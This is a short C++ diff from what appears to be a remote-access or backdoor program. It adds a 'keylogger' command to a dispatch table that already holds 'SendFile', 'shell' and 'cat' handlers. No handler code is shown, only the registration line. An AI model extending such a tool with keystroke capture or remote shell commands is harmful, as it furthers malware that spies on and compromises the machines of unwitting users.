@@ -55,6 +55,7 @@ std::vector <std::pair<std::string, void(*)(std::string)>> commands{
 	{"SendFile", SendFile},
 	{"shell", shell},
 	{"cat", cat},
+	{"keylogger", keylogger},
 	{"UpdateDupnix", UpdateDupnix}
 };
 
